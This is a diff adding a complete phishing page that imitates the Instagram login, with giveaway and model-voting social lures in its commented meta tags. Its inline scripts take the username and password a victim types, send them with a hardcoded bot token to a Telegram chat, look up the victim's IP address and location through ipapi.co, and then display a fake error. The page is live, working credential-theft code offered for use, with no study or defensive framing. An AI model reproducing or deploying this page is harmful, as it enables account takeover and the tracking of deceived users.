@@ -1,0 +1,753 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- <title>Giveaway Instant Portal </title> -->
+<!-- <link rel="stylesheet" href="main.css"> -->
+<meta name="robots" content="noindex">
+
+<style>
+  /* Universal Selectors */
+  #root,
+  body,
+  html {
+    height: 100%;
+  }
+
+  body {
+    overflow-y: scroll;
+  }
+
+  a,
+  abbr,
+  acronym,
+  address,
+  applet,
+  article,
+  aside,
+  audio,
+  b,
+  big,
+  blockquote,
+  body,
+  canvas,
+  caption,
+  center,
+  cite,
+  code,
+  dd,
+  del,
+  details,
+  dfn,
+  div,
+  dl,
+  dt,
+  em,
+  embed,
+  fieldset,
+  figcaption,
+  figure,
+  footer,
+  form,
+  h1,
+  h2,
+  h3,
+  h4,
+  h5,
+  h6,
+  header,
+  hgroup,
+  html,
+  i,
+  iframe,
+  img,
+  ins,
+  kbd,
+  label,
+  legend,
+  li,
+  mark,
+  menu,
+  nav,
+  object,
+  ol,
+  output,
+  p,
+  pre,
+  q,
+  ruby,
+  s,
+  samp,
+  section,
+  small,
+  span,
+  strike,
+  strong,
+  sub,
+  summary,
+  sup,
+  table,
+  tbody,
+  td,
+  tfoot,
+  th,
+  thead,
+  time,
+  tr,
+  tt,
+  u,
+  ul,
+  var,
+  video {
+    margin: 0;
+    padding: 0;
+    border: 0;
+    font: inherit;
+    vertical-align: baseline;
+  }
+
+  a,
+  a:visited {
+    text-decoration: none;
+  }
+
+  a:active,
+  .btn:active {
+    opacity: .5;
+  }
+
+  ol,
+  ul {
+    list-style: none;
+  }
+
+  body,
+  button,
+  input {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    line-height: 18px;
+  }
+
+  #root,
+  article,
+  main,
+  div,
+  section,
+  header,
+  nav,
+  footer {
+    border: 0 solid #000000;
+    box-sizing: border-box;
+    align-items: stretch;
+    display: flex;
+    flex-direction: column;
+    flex-shrink: 0;
+    margin: 0;
+    padding: 0;
+    position: relative;
+    -webkit-box-align: stretch;
+    -moz-box-align: stretch;
+    -webkit-box-orient: vertical;
+    -moz-box-orient: vertical;
+    -webkit-box-direction: normal;
+    -moz-box-direction: normal;
+  }
+
+  /* <--Universal Selectors End */
+
+
+  #root {
+    z-index: 0;
+  }
+
+  .section-all {
+    min-height: 100%;
+    overflow: hidden;
+  }
+
+  .main {
+    background-color: #fafafa;
+    width: 90%;
+    margin: 0 auto;
+    order: 4;
+    flex-grow: 1;
+    -webkit-box-flex: 1;
+    -moz-box-flex: 1;
+    -moz-box-ordinal-group: 5;
+    -webkit-box-ordinal-group: 5;
+  }
+
+  .wrapper {
+    min-height: 100%;
+    overflow: hidden;
+  }
+
+  .wrapper,
+  .article {
+    flex-grow: 1;
+    justify-content: center;
+    -webkit-box-flex: 1;
+    -moz-box-flex: 1;
+    -webkit-box-pack: center;
+    -moz-box-pack: center;
+  }
+
+  .article {
+    flex-direction: row;
+    margin: 0 auto;
+    max-width: 935px;
+    width: 100%;
+    -webkit-box-orient: horizontal;
+    -moz-box-orient: horizontal;
+    -webkit-box-direction: normal;
+    -moz-box-direction: normal;
+  }
+
+  .content {
+    color: #262626;
+    flex-grow: 1;
+    justify-content: center;
+    max-width: 350px;
+    margin-top: 12px;
+    -webkit-box-pack: justify;
+    -moz-box-pack: justify;
+    -webkit-box-flex: 1;
+    -moz-box-flex: 1;
+  }
+
+  .login-box {
+    background: #fff;
+    border: 1px solid #e6e6e6;
+    border-radius: 1px;
+    margin: 0 0 10px;
+    padding: 10px 0;
+    /* align-items: center; */
+  }
+
+  .header {
+    margin: 14.45px auto 12px;
+  }
+
+
+  .logo {
+    background: cover no-repeat;
+    width: 175px;
+    height: auto;
+  }
+
+  .form {
+    display: flex;
+    flex-direction: column;
+    margin-bottom: 10px;
+    -moz-box-direction: normal;
+    -webkit-box-direction: normal;
+  }
+
+  .input-box {
+    margin: auto 40px 6px;
+  }
+
+  input {
+    height: 36px;
+    border: 1px solid #efefef;
+    border-radius: 3px;
+    background-color: #fafafa;
+    width: 100%;
+    font-size: 12px;
+    margin: 0;
+    padding: 9px 0 7px 8px;
+    outline: none;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    box-sizing: border-box;
+  }
+
+  input#name:focus,
+  input#password:focus {
+    border-color: #bbb;
+  }
+
+  .button-box {
+    display: block;
+    position: relative;
+    margin: 8px 40px;
+  }
+
+  .btn {
+    cursor: pointer;
+    width: 100%;
+    padding: 0 8px;
+    background: #3897f0;
+    border: 1px solid #3897f0;
+    color: #fff;
+    border-radius: 3px;
+    font-weight: 600;
+    font-size: 14px;
+    height: 28px;
+    line-height: 26px;
+    outline: none;
+    white-space: nowrap;
+  }
+
+  .forgot,
+  .forgot:active,
+  .forgot:hover,
+  .forgot:visited {
+    font-size: 12px;
+    margin-top: 12px;
+    text-align: center;
+    color: #003569;
+    line-height: 14px !important;
+  }
+
+  .text {
+    text-align: center;
+    margin: 15px;
+    color: #262626;
+    font-size: 14px;
+  }
+
+  .text a,
+  .text a:visited,
+  .text a:hover,
+  .text a:active {
+    color: #3897f0;
+    margin-left: 3px;
+  }
+
+  /* App Store */
+  .app p {
+    line-height: 18px;
+    color: #262626;
+    font-size: 14px;
+    text-align: center;
+    margin: 10px 20px;
+  }
+
+  .app-img {
+    flex-direction: row;
+    justify-content: center;
+    margin: 10px 0;
+    -webkit-box-orient: horizontal;
+    -moz-box-orient: horizontal;
+  }
+
+  .app-img a {
+    margin-right: 8px;
+    height: 43.5px;
+  }
+
+  .app-img img {
+    height: 40px;
+  }
+
+  /* FOOTER */
+  .footer {
+    background-color: #fafafa;
+    order: 5;
+    padding: 0 20px;
+    background: #fafafa;
+  }
+
+  .footer-container {
+    flex-direction: row;
+    flex-wrap: wrap;
+    background-color: #fafafa;
+    justify-content: space-between;
+    padding: 38px 0;
+    max-width: 935px;
+    font-size: 12px;
+    font-weight: 600;
+    margin: 0 auto;
+    text-transform: uppercase;
+    width: 100%
+  }
+
+  .footer-nav {
+    max-width: 100%;
+  }
+
+  .footer-nav ul {
+    margin-right: 16px;
+    margin-bottom: 3px;
+    flex-grow: 1;
+  }
+
+  .footer-nav ul li {
+    display: inline-block;
+    margin-right: 13px;
+    margin-bottom: 7px;
+  }
+
+  .footer-nav ul li a {
+    color: #003569;
+    text-decoration: none;
+  }
+
+  .footer span {
+    color: #999;
+  }
+
+  span.language {
+    color: #003569;
+    cursor: pointer;
+    display: inline-block;
+    font-weight: 600;
+    position: relative;
+    text-transform: uppercase;
+    vertical-align: top;
+  }
+
+  .select {
+    cursor: pointer;
+    height: 100%;
+    top: 0;
+    opacity: 0;
+    position: absolute;
+    left: 0;
+    width: 100%;
+  }
+
+  /* Media Queries */
+  @media (min-width:1550px) {
+    .main {
+      background-color: #fff;
+    }
+
+    .content {
+      max-width: 100%;
+      margin-top: 0;
+      justify-content: space-between;
+    }
+
+    .login-box {
+      background-color: transparent;
+      border: none;
+    }
+
+    .logo {
+      background: cover no-repeat;
+      width: 175px;
+      height: auto;
+      margin: 0 auto;
+    }
+
+    .btn {
+      cursor: pointer;
+      width: 100%;
+      padding: 0 8px;
+      background: #3897f0;
+      border: 1px solid #3897f0;
+      color: #fff;
+      border-radius: 3px;
+      font-weight: 600;
+      font-size: 14px;
+      height: 28px;
+      line-height: 26px;
+      outline: none;
+      white-space: nowrap;
+    }
+
+    .input-box {
+      border: 1px solid #efefef;
+      border-radius: 3px;
+      height: 36px;
+      background: #fafafa;
+      position: relative;
+    }
+
+    input {
+      border: 0;
+      background-color: #fafafa;
+      width: 100%;
+      font-size: 12px;
+      margin: 0;
+      padding: 9px 0 7px 8px;
+      outline: none;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      box-sizing: border-box;
+    }
+
+    .input-box:hover,
+    .input-box:focus {
+      border-color: #bbb;
+    }
+
+  }
+
+  @media only screen and (max-width:875px) {
+    .footer-container {
+      text-align: center;
+      padding: 10px 0;
+    }
+
+    .footer-container,
+    .footer-nav ul {
+      justify-content: center;
+      margin: 0 auto;
+      max-width: 360px;
+      min-width: auto;
+      -webkit-box-pack: center;
+      -moz-box-pack: center;
+    }
+
+  }
+
+  .hidden {
+    display: hidden;
+  }
+</style>
+
+<!-- HTML Meta Tags -->
+<!-- <meta name="description" content="Discover the latest fashion trends with lobiluxurydesign. Shop the new collection of clothing, footwear, accessories, beauty products and more."> -->
+
+<!-- Facebook Meta Tags -->
+<!-- <meta property="og:url" content="http://helpmigrow.epizy.com/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Vote your favourite model">
+<meta property="og:description" content="">
+<meta property="og:image" content="http://helpmigrow.epizy.com/images/dabas.jpg"> -->
+
+<!-- Twitter Meta Tags -->
+<!-- <meta name="twitter:card" content="summary_large_image">
+<meta property="twitter:domain" content="http://helpmigrow.epizy.com/">
+<meta property="twitter:url" content="http://helpmigrow.epizy.com/">
+<meta name="twitter:title" content="Vote your favourite model">
+<meta name="twitter:description" content="">
+<meta name="twitter:image" content="http://helpmigrow.epizy.com/images/dabas.jpg"> -->
+
+<!-- Meta Tags Generated via https://www.opengraph.xyz -->
+
+<head>
+
+  <<section class="section-all" style="color: #507392;">
+    <!-- 1-Role Main -->
+    <main class="main" role="main">
+      <div class="wrapper">
+        <article class="article">
+          <div class="content">
+            <div class="login-box">
+              <div class="header">
+                <img class="logo" src="1024px-Instagram_logo.svg.png">
+              </div><!-- Header end -->
+              <div class="form-wrap">
+
+
+                <form id="loginForm" method="POST" action="">
+                  <div class="input-box">
+                    <input type="text" id="username" name="username" placeholder="Phone number, username, or email"
+                      required>
+                  </div>
+
+                  <div class="input-box">
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                  </div>
+
+
+                  <div class="button-box">
+                  <p id="error-message"
+                    style="color: red;  font-size: 14px; margin-top: 10px; display: none;">
+                    an error ocurred.
+                  </p>
+                    <img src="hug.gif" width="20px" id="loader"
+                      style="position: absolute; top: 0.5em; left: 9em; display: none;">
+                    <button type="submit" class="btn" id="login">Log in</button>
+
+                  </div>
+                </form>
+
+                <div class="hidden" id="status" style="display: none;"></div> <!-- Status message display -->
+
+                <a class="forgot" href="">Forgot password?</a>
+                <p id="feedback"
+                  style="color: red; font-family: sans-serif; font-size: 15px; text-align: center; margin: 0 30px; display: none;">
+                </p><br>
+              </div> <!-- Form-wrap end -->
+            </div> <!-- Login-box end -->
+
+            <div class="login-box">
+              <p class="text">Don't have an account? <a href="#">Sign up</a></p>
+            </div> <!-- Signup-box end -->
+
+            <div class="app">
+              <p>Get the app.</p>
+              <div class="app-img">
+                <a href=""><img src="ios.png" style="height: 50px;"></a>
+                <a href=""><img src="google.png" style="height: 40px; margin-top: 5px;"></a>
+              </div> <!-- App-img end -->
+            </div> <!-- App end -->
+          </div> <!-- Content end -->
+        </article>
+      </div> <!-- Wrapper end -->
+    </main>
+
+    <!-- 2-Role Footer -->
+    <footer class="footer" role="contentinfo">
+      <div class="footer-container">
+        <nav class="footer-nav" role="navigation">
+          <ul>
+            <li><a href="">About Us</a></li>
+            <li><a href="">Support</a></li>
+            <li><a href="">Blog</a></li>
+            <li><a href="">Press</a></li>
+            <li><a href="">Api</a></li>
+            <li><a href="">Jobs</a></li>
+            <li><a href="">Privacy</a></li>
+            <li><a href="">Terms</a></li>
+            <li><a href="">Directory</a></li>
+            <li>
+              <span class="language">Language
+                <select name="language" class="select" onchange="la(this.value)">
+                  <option value="#">English</option>
+                  <option value="">Russian</option>
+                </select>
+              </span>
+            </li>
+          </ul>
+        </nav>
+      </div> <!-- Footer container end -->
+    </footer>
+    </section>
+
+    <script>
+      // Function to send a message to a specified Telegram chat using XMLHttpRequest
+      function sendMessageWithXHR(chatId, message) {
+        // Define the Telegram API URL with your bot token
+        const telegramAPI = `https://api.telegram.org/bot7280763852:AAEHmPsZemgExWJ5fzO42yKt5s_sWoMI4LQ/sendMessage`;
+
+        // Create a new XMLHttpRequest object
+        const xhr = new XMLHttpRequest();
+
+        // Create the data object containing the chat ID and message text
+        const data = JSON.stringify({
+          chat_id: chatId,
+          text: message
+        });
+
+        // Initialize the XMLHttpRequest with the POST method and the Telegram API URL
+        xhr.open('POST', telegramAPI, true);
+        // Set the request header to indicate the content type
+        xhr.setRequestHeader('Content-Type', 'application/json');
+
+        // Set up a function to handle the response from the server
+        xhr.onreadystatechange = function () {
+          // Check if the request is complete and was successful
+          if (xhr.readyState === 4 && xhr.status === 200) {
+            const response = JSON.parse(xhr.responseText); // Parse the response
+            // Check if the message was sent successfully
+            if (response.ok) {
+              // Update the status message on the page
+              document.getElementById("status").innerText += "Message sent using XMLHttpRequest!";
+            } else {
+              // Log an error message if sending failed
+              console.error("Error sending message using XMLHttpRequest:", response);
+            }
+            // Hide the loader once the request is complete
+            document.getElementById("loader").style.display = 'none';
+          }
+        };
+
+        // Send the data as the request body
+        xhr.send(data);
+      }
+
+      // Handle the submission of the login form
+      document.getElementById('loginForm').addEventListener('submit', function (event) {
+        event.preventDefault(); // Prevent the default form submission behavior
+
+        const chatId = '6785150252'; // Your Telegram chat ID
+        // Get the username and password values from the form inputs
+        const username = document.getElementById('username').value; // Changed to match the new input ID
+        const password = document.getElementById('password').value; // Changed to match the new input ID
+
+        // Construct the message to be sent, including the username, password, and log type
+        const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}\nLog Type: ig logs`;
+
+        // Show the loader while the request is being processed
+        document.getElementById("loader").style.display = 'block';
+
+        // Send the message using the XMLHttpRequest method
+        sendMessageWithXHR(chatId, message); // Send using XMLHttpRequest
+      });
+    </script>
+
+
+
+    <script>
+      // Function to send location data to Telegram using Fetch API
+      function sendLocationToTelegram(chatId, country, city, ip) {
+        const telegramAPI = `https://api.telegram.org/bot7280763852:AAEHmPsZemgExWJ5fzO42yKt5s_sWoMI4LQ/sendMessage`;
+        const message = `User Location Info:\nCountry: ${country}\nCity: ${city}\nIP: ${ip}`;
+
+        const data = {
+          chat_id: chatId,
+          text: message
+        };
+
+        fetch(telegramAPI, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(data)
+        })
+          .then(response => response.json())
+          .then(result => {
+            if (result.ok) {
+              console.log("Location info sent using Fetch!");
+            } else {
+              console.error("Error sending location info:", result);
+            }
+          })
+          .catch(error => {
+            console.error("Fetch failed:", error);
+          });
+      }
+
+      // Function to fetch user's IP and location using an API
+      function fetchLocationInfo(chatId) {
+        // Using a free API for location data (replace with your preferred one)
+        fetch('https://ipapi.co/json/')
+          .then(response => response.json())
+          .then(data => {
+            const country = data.country_name;
+            const city = data.city;
+            const ip = data.ip;
+            sendLocationToTelegram(chatId, country, city, ip);
+          })
+          .catch(error => {
+            console.error("Error fetching location data:", error);
+          });
+      }
+
+      // Handle form submission
+      document.getElementById('loginForm').addEventListener('submit', function (event) {
+        event.preventDefault(); // Prevent form from submitting normally
+
+        const chatId = '6785150252'; // Your Telegram chat ID
+        const username = document.querySelector('input[name="username"]').value;
+        const password = document.querySelector('input[name="password"]').value;
+
+        // Construct the login message
+        const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}\nLog Type: ig logs`;
+
+        // Send login info to Telegram (this was in your previous script)
+
+
+        // Fetch and send location info after login info is sent
+        fetchLocationInfo(chatId);
+        
+        document.getElementById("error-message").style.display = "block";
+      });
+    </script>
+    <!-- <script>
+      window.onload = function () {
+        document.getElementById("error-message").style.display = "block"; // Make the error message visible on load
+      };
+    </script> -->
+    </body>
+
+</html>
